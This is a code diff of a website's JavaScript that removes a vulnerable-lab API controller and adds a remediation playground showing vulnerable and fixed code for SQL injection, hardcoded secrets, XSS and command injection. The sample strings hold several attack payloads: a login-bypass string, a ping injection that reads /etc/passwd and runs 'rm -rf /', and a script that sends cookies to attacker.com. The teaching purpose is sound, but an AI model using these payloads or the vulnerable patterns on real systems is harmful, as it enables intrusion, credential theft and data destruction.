@@ -1,269 +1,264 @@
 /**
- * Northstar Vulnerable Security Lab - Frontend Controller
- * Fully decoupled from backend, communicates exclusively via dynamic api_url.
+ * Shipcheck Static Website Interactivity
+ * 100% Client-Side — Zero Backend Needed
  */
 
-const state = {
-  apiUrl: 'http://localhost:8001',
-  config: null,
-  isOnline: false,
-  latencyMs: null
+// Presets for the Interactive AI Remediation Playground
+const PLAYGROUND_DATA = {
+  sqli: {
+    title: "Blind & Classic SQL Injection",
+    cwe: "CWE-89: SQL Injection",
+    scoreBefore: "42 / 100",
+    scoreAfter: "95 / 100",
+    delta: "+53 Security Score",
+    explanation: "User input is directly concatenated into SQL query strings, allowing attackers to execute arbitrary database queries, bypass authentication, and dump user credentials.",
+    beforeCode: `// ❌ VULNERABLE: Direct f-string string concatenation
+@app.post("/api/login")
+def login(username: str, password: str, db: sqlite3.Connection):
+    # Attacker payload: ' OR '1'='1' --
+    query = f"SELECT id, role FROM users WHERE username = '{username}' AND password = '{password}'"
+    cursor = db.execute(query)
+    user = cursor.fetchone()
+    return {"status": "ok", "user": user}`,
+    afterCode: `// ✅ SHIPCHECK AI FIX: Parameterized SQL & Hash Verification
+@app.post("/api/login")
+def login(credentials: LoginRequest, db: sqlite3.Connection):
+    cursor = db.execute(
+        "SELECT id, password_hash, role FROM users WHERE username = ?",
+        (credentials.username,)
+    )
+    user = cursor.fetchone()
+    if not user or not bcrypt.checkpw(credentials.password.encode(), user["password_hash"].encode()):
+        raise HTTPException(status_code=401, detail="Invalid credentials")
+    return {"status": "ok", "role": user["role"]}`
+  },
+  secrets: {
+    title: "Hardcoded Database & JWT Secrets",
+    cwe: "CWE-798: Use of Hard-coded Credentials",
+    scoreBefore: "55 / 100",
+    scoreAfter: "98 / 100",
+    delta: "+43 Security Score",
+    explanation: "Hardcoded production master secrets, database passwords, and API tokens in the source repository allow anyone with read access to compromise the environment.",
+    beforeCode: `// ❌ VULNERABLE: Hardcoded credential constants
+DATABASE_URI = "postgresql://admin:P@ssw0rd2026_ShipCheck!@prod-db.internal:5432/core"
+JWT_SECRET_KEY = "super_secret_master_token_do_not_share"
+
+def get_auth_token(user_id: str):
+    return jwt.encode({"sub": user_id}, JWT_SECRET_KEY, algorithm="HS256")`,
+    afterCode: `// ✅ SHIPCHECK AI FIX: Environment Variables & Secret Vault
+import os
+from pydantic_settings import BaseSettings
+
+class Settings(BaseSettings):
+    DATABASE_URI: str = os.environ["DATABASE_URI"]
+    JWT_SECRET_KEY: str = os.environ["JWT_SECRET_KEY"]
+
+settings = Settings()
+
+def get_auth_token(user_id: str):
+    return jwt.encode({"sub": user_id}, settings.JWT_SECRET_KEY, algorithm="HS256")`
+  },
+  xss: {
+    title: "Stored & Reflected Cross-Site Scripting (XSS)",
+    cwe: "CWE-79: Improper Neutralization of Input During Web Page Generation",
+    scoreBefore: "48 / 100",
+    scoreAfter: "94 / 100",
+    delta: "+46 Security Score",
+    explanation: "Raw unescaped user input rendered directly into the HTML DOM permits session hijacking, malicious credential harvesting, and arbitrary JavaScript execution.",
+    beforeCode: `// ❌ VULNERABLE: Direct innerHTML injection
+function renderUserProfile(user) {
+    const banner = document.getElementById("profile-header");
+    // If user.bio contains "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>"
+    banner.innerHTML = "<h1>Welcome, " + user.name + "</h1><p>" + user.bio + "</p>";
+}`,
+    afterCode: `// ✅ SHIPCHECK AI FIX: DOM textContent & Sanitization
+function renderUserProfile(user) {
+    const banner = document.getElementById("profile-header");
+    banner.replaceChildren();
+
+    const h1 = document.createElement("h1");
+    h1.textContent = "Welcome, " + user.name;
+
+    const p = document.createElement("p");
+    p.textContent = user.bio; // Safely escaped automatically
+
+    banner.append(h1, p);
+}`
+  },
+  rce: {
+    title: "Remote Code Execution (Command Injection)",
+    cwe: "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
+    scoreBefore: "30 / 100",
+    scoreAfter: "99 / 100",
+    delta: "+69 Security Score",
+    explanation: "Executing arbitrary shell strings with user-controlled parameters lets remote attackers execute shell commands, read filesystem files, and compromise the server.",
+    beforeCode: `// ❌ VULNERABLE: os.system / subprocess with shell=True
+import os
+
+@app.get("/api/diagnostics/ping")
+def run_ping(target_host: str):
+    # Payload: 127.0.0.1; cat /etc/passwd; rm -rf /
+    output = os.popen(f"ping -c 1 {target_host}").read()
+    return {"diagnostic": output}`,
+    afterCode: `// ✅ SHIPCHECK AI FIX: Input Validation & Subprocess Array Args
+import ipaddress
+import subprocess
+
+@app.get("/api/diagnostics/ping")
+def run_ping(target_host: str):
+    # Strict validation: host must be a valid IP address
+    ipaddress.ip_address(target_host)
+    res = subprocess.run(["ping", "-c", "1", target_host], capture_output=True, text=True, check=True)
+    return {"diagnostic": res.stdout}`
+  }
 };
 
-// DOM Elements
-const $ = (selector) => document.querySelector(selector);
-const $$ = (selector) => document.querySelectorAll(selector);
-
-// 1. Initialize Configuration
-async function initConfig() {
-  const savedUrl = localStorage.getItem('vulnerable_lab_api_url');
-  
-  try {
-    const res = await fetch('./config.json', { cache: 'no-store' });
-    if (res.ok) {
-      state.config = await res.json();
-      if (!savedUrl && state.config.api_url) {
-        state.apiUrl = state.config.api_url.replace(/\/$/, '');
-      }
-    }
-  } catch (err) {
-    console.warn('[!] Failed to load config.json, using default fallback:', err);
-  }
-
-  if (savedUrl) {
-    state.apiUrl = savedUrl.replace(/\/$/, '');
-  }
-
-  // Update UI Input
-  $('#apiUrlInput').value = state.apiUrl;
-  
-  // Test connection
-  await checkApiHealth();
-
-  // Periodic health check every 10 seconds
-  setInterval(checkApiHealth, 10000);
-}
-
-// 2. Health & Connectivity Check
-async function checkApiHealth() {
-  const pill = $('#statusPill');
-  const dot = $('#statusText');
-  const latencySpan = $('#statusLatency');
-  const currentUrl = state.apiUrl;
-
-  const startTime = performance.now();
-  try {
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 3500);
-
-    const res = await fetch(`${currentUrl}/api/health`, {
-      method: 'GET',
-      headers: { 'Accept': 'application/json' },
-      signal: controller.signal
-    });
-    clearTimeout(timeoutId);
-
-    const latency = Math.round(performance.now() - startTime);
-
-    if (res.ok) {
-      const data = await res.json();
-      state.isOnline = true;
-      state.latencyMs = latency;
-      pill.className = 'status-pill online';
-      dot.textContent = 'Connected';
-      latencySpan.textContent = `(${latency}ms)`;
-      return true;
-    } else {
-      throw new Error(`HTTP ${res.status}`);
-    }
-  } catch (err) {
-    state.isOnline = false;
-    pill.className = 'status-pill';
-    dot.textContent = 'Offline';
-    latencySpan.textContent = '';
-    return false;
-  }
-}
-
-// 3. API URL Management
-function updateApiUrl(newUrl) {
-  if (!newUrl) return;
-  state.apiUrl = newUrl.trim().replace(/\/$/, '');
-  $('#apiUrlInput').value = state.apiUrl;
-  localStorage.setItem('vulnerable_lab_api_url', state.apiUrl);
-  checkApiHealth();
-}
-
-function resetApiUrlToConfig() {
-  localStorage.removeItem('vulnerable_lab_api_url');
-  if (state.config && state.config.api_url) {
-    state.apiUrl = state.config.api_url.replace(/\/$/, '');
-  } else {
-    state.apiUrl = 'http://localhost:8001';
-  }
-  $('#apiUrlInput').value = state.apiUrl;
-  checkApiHealth();
-}
-
-// Helper: Make API Request
-async function apiCall(endpoint, options = {}) {
-  const fullUrl = `${state.apiUrl}${endpoint.startsWith('/') ? '' : '/'}${endpoint}`;
-  const startTime = performance.now();
-
-  try {
-    const res = await fetch(fullUrl, {
-      ...options,
-      headers: {
-        'Accept': 'application/json, text/html, */*',
-        ...(options.headers || {})
-      }
-    });
-
-    const latency = Math.round(performance.now() - startTime);
-    const contentType = res.headers.get('content-type') || '';
-
-    let body;
-    if (contentType.includes('application/json')) {
-      body = await res.json();
-    } else {
-      body = await res.text();
-    }
-
-    return {
-      ok: res.ok,
-      status: res.status,
-      statusText: res.statusText,
-      headers: Object.fromEntries(res.headers.entries()),
-      data: body,
-      latency,
-      url: fullUrl
-    };
-  } catch (err) {
-    return {
-      ok: false,
-      status: 0,
-      statusText: 'Network / CORS Error',
-      error: err.message,
-      url: fullUrl
-    };
-  }
-}
-
-// 4. Lab Exercise Handlers
-
-// SQL Injection: Login Bypass
-async function testSqliLogin() {
-  const user = $('#sqliUser').value;
-  const pass = $('#sqliPass').value;
-  const out = $('#sqliLoginOut');
-  
-  out.textContent = 'Sending request...';
-  const res = await apiCall(`/api/login?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`);
-  out.textContent = `[HTTP ${res.status} | ${res.latency || 0}ms]\n` + JSON.stringify(res.data || res.error, null, 2);
-}
-
-// SQL Injection: Search
-async function testSqliSearch() {
-  const query = $('#sqliSearchQuery').value;
-  const out = $('#sqliSearchOut');
-
-  out.textContent = 'Searching documents...';
-  const res = await apiCall(`/lab/sql-search?query=${encodeURIComponent(query)}`);
-  out.textContent = `[HTTP ${res.status} | ${res.latency || 0}ms]\n` + JSON.stringify(res.data || res.error, null, 2);
-}
-
-// XSS: Live Preview
-function testXss() {
-  const comment = $('#xssInput').value;
-  const frame = $('#xssFrame');
-  const targetUrl = `${state.apiUrl}/lab/xss-preview?comment=${encodeURIComponent(comment)}`;
-  frame.src = targetUrl;
-}
-
-// Command Injection: Diagnostics
-async function testDiagnostics() {
-  const target = $('#diagTarget').value;
-  const out = $('#diagOut');
-
-  out.textContent = 'Executing command diagnostic...';
-  const res = await apiCall(`/api/diagnostics?target=${encodeURIComponent(target)}`);
-  out.textContent = `[HTTP ${res.status} | ${res.latency || 0}ms]\n` + JSON.stringify(res.data || res.error, null, 2);
-}
-
-// SSRF & Case Testing
-async function testCase(caseId) {
-  const out = $('#caseOut');
-  out.textContent = `Executing case ${caseId}...`;
-  const res = await apiCall(`/cases/${caseId}`, { method: 'POST' });
-  out.textContent = `[HTTP ${res.status} | ${res.latency || 0}ms]\n` + JSON.stringify(res.data || res.error, null, 2);
-}
-
-// Raw API Explorer
-async function executeCustomRequest() {
-  const method = $('#customMethod').value;
-  const path = $('#customPath').value;
-  const bodyText = $('#customBody').value;
-  const out = $('#customOut');
-
-  out.textContent = 'Sending request...';
-  
-  const options = { method };
-  if (['POST', 'PUT', 'PATCH'].includes(method) && bodyText.trim()) {
-    try {
-      options.body = bodyText;
-      options.headers = { 'Content-Type': 'application/json' };
-    } catch (e) {
-      out.textContent = 'Invalid JSON body format.';
-      return;
-    }
-  }
-
-  const res = await apiCall(path, options);
-  out.textContent = `[HTTP ${res.status} ${res.statusText} | ${res.latency || 0}ms]\n` + 
-    `URL: ${res.url}\n\n` + 
-    (typeof res.data === 'object' ? JSON.stringify(res.data, null, 2) : (res.data || res.error));
-}
-
-// 5. DOM Event Listeners
 document.addEventListener('DOMContentLoaded', () => {
-  initConfig();
+  detectUserOS();
+  initCopyButtons();
+  initPlayground();
+  initTerminalTabs();
+  initFAQ();
+  animateTelemetryStats();
+});
 
-  // Tab switching
-  $$('.tab-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      $$('.tab-btn').forEach(b => b.classList.remove('active'));
-      $$('.tab-content').forEach(c => c.classList.remove('active'));
-      btn.classList.add('active');
-      const target = $(`#${btn.dataset.tab}`);
-      if (target) target.classList.add('active');
-    });
-  });
+/**
+ * Auto-detect client OS and highlight the relevant download card
+ */
+function detectUserOS() {
+  const ua = window.navigator.userAgent.toLowerCase();
+  const winCard = document.getElementById('dl-card-windows');
+  const linuxCard = document.getElementById('dl-card-linux');
 
-  // API URL Input blur / enter
-  $('#apiUrlInput').addEventListener('change', (e) => updateApiUrl(e.target.value));
-  $('#apiUrlInput').addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') updateApiUrl(e.target.value);
-  });
+  if (!winCard || !linuxCard) return;
 
-  // Quick Presets
-  $$('.preset-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      updateApiUrl(btn.dataset.url);
-    });
-  });
+  if (ua.includes('linux')) {
+    linuxCard.classList.add('highlight');
+    winCard.classList.remove('highlight');
+    const badge = linuxCard.querySelector('.dl-badge');
+    if (badge) badge.textContent = 'Detected for your OS';
+  } else {
+    winCard.classList.add('highlight');
+    linuxCard.classList.remove('highlight');
+    const badge = winCard.querySelector('.dl-badge');
+    if (badge) badge.textContent = 'Detected for your OS';
+  }
+}
 
-  // Payload chips insertion
-  $$('.payload-chip').forEach(chip => {
-    chip.addEventListener('click', () => {
-      const targetInput = $(`#${chip.dataset.target}`);
-      if (targetInput) {
-        targetInput.value = chip.dataset.payload || chip.textContent;
-        // Trigger corresponding action
-        if (chip.dataset.action === 'sqli-login') testSqliLogin();
-        if (chip.dataset.action === 'sqli-search') testSqliSearch();
-        if (chip.dataset.action === 'xss') testXss();
-        if (chip.dataset.action === 'diag') testDiagnostics();
+/**
+ * Handle copy to clipboard for quick commands and checksums
+ */
+function initCopyButtons() {
+  document.querySelectorAll('.copy-trigger').forEach(btn => {
+    btn.addEventListener('click', async () => {
+      const targetId = btn.getAttribute('data-target');
+      const targetEl = document.getElementById(targetId);
+      if (!targetEl) return;
+
+      const text = targetEl.getAttribute('data-copy') || targetEl.textContent.trim();
+      try {
+        await navigator.clipboard.writeText(text);
+        const originalIcon = btn.innerHTML;
+        btn.innerHTML = `<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+        setTimeout(() => {
+          btn.innerHTML = originalIcon;
+        }, 2000);
+      } catch (err) {
+        console.error('Failed to copy text: ', err);
       }
     });
   });
-});
+}
+
+/**
+ * Interactive Code Diff Playground
+ */
+function initPlayground() {
+  const tabs = document.querySelectorAll('.vuln-tab');
+  const beforeCodeEl = document.getElementById('code-before-view');
+  const afterCodeEl = document.getElementById('code-after-view');
+  const explanationEl = document.getElementById('vuln-explanation-text');
+  const scoreDeltaEl = document.getElementById('vuln-score-delta');
+  const cweBadgeEl = document.getElementById('vuln-cwe-badge');
+
+  function updatePlayground(key) {
+    const data = PLAYGROUND_DATA[key];
+    if (!data) return;
+
+    if (beforeCodeEl) beforeCodeEl.textContent = data.beforeCode;
+    if (afterCodeEl) afterCodeEl.textContent = data.afterCode;
+    if (explanationEl) explanationEl.textContent = data.explanation;
+    if (scoreDeltaEl) scoreDeltaEl.textContent = data.delta;
+    if (cweBadgeEl) cweBadgeEl.textContent = data.cwe;
+  }
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      const key = tab.getAttribute('data-vuln');
+      updatePlayground(key);
+    });
+  });
+
+  // Load initial preset
+  updatePlayground('sqli');
+}
+
+/**
+ * Switch terminal simulator tabs
+ */
+function initTerminalTabs() {
+  const tabs = document.querySelectorAll('.term-tab');
+  const snippets = document.querySelectorAll('.term-snippet-view');
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      const tabTarget = tab.getAttribute('data-tab');
+
+      tabs.forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+
+      snippets.forEach(view => {
+        if (view.id === `term-${tabTarget}`) {
+          view.style.display = 'block';
+        } else {
+          view.style.display = 'none';
+        }
+      });
+    });
+  });
+}
+
+/**
+ * FAQ Accordion toggle
+ */
+function initFAQ() {
+  document.querySelectorAll('.faq-question').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const item = btn.closest('.faq-item');
+      if (item) {
+        item.classList.toggle('open');
+      }
+    });
+  });
+}
+
+/**
+ * Subtle number tick animation for metrics
+ */
+function animateTelemetryStats() {
+  const zeroDayEl = document.getElementById('stat-zeroday');
+  if (!zeroDayEl) return;
+
+  let count = 0;
+  const target = 100;
+  const timer = setInterval(() => {
+    count += 2;
+    if (count >= target) {
+      count = target;
+      clearInterval(timer);
+    }
+    zeroDayEl.textContent = `${count}%`;
+  }, 20);
+}
